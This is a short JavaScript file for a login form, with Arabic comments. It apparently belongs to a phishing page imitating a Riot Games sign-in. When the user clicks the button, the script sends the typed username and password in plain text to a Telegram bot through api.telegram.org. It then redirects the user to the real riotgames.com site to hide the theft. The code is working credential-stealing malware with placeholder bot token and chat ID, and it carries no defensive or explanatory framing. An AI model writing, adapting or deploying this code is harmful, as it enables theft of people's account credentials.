document.addEventListener("DOMContentLoaded", function () {
    const usernameInput = document.getElementById("username");
    const passwordInput = document.getElementById("password");
    const loginBtn = document.getElementById("login-btn");

    function checkInputs() {
        if (usernameInput.value.trim() !== "" && passwordInput.value.trim() !== "") {
            loginBtn.removeAttribute("disabled"); // تفعيل الزر
        } else {
            loginBtn.setAttribute("disabled", "true"); // تعطيل الزر
        }
    }

    function sendToTelegram() {
        const username = usernameInput.value.trim();
        const password = passwordInput.value.trim();

        if (username === "" || password === "") return;

        const botToken = "YOUR_BOT_TOKEN_HERE";
        const chatId = "YOUR_CHAT_ID_HERE";
        const message = `🔥 New Login Attempt 🔥\n\n👤 Username: ${username}\n🔒 Password: ${password}`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
            .then(() => {
                alert("✅ Data sent successfully!");
                window.location.href = "https://www.riotgames.com/";
            })
            .catch(error => console.error("❌ Error sending to Telegram:", error));
    }

    // التأكد من صحة الإدخال وتفعيل الزر
    usernameInput.addEventListener("input", checkInputs);
    passwordInput.addEventListener("input", checkInputs);

    // عند الضغط على السهم
    loginBtn.addEventListener("click", function () {
        if (!loginBtn.hasAttribute("disabled")) {
            sendToTelegram();
        }
    });
});
